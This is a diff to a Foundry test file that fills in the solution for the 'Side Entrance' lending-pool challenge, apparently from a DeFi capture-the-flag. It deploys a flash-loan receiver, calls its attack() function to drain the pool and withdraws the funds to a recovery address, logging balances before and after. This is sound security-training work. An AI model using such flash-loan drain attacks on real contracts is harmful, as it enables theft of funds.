@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {FlashLoanReceiver} from "../../src/side-entrance/FlashLoanReceiver.sol";
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +46,15 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
+        console.log("pool balance: ", address(pool).balance);
+        console.log("recovery balance: ", recovery.balance);
+
+        FlashLoanReceiver receiver = new FlashLoanReceiver(address(pool));
+        receiver.attack();
+        receiver.withdraw(payable(recovery));
         
+        console.log("pool balance: ", address(pool).balance);
+        console.log("recovery balance: ", recovery.balance);
     }
 
     /**
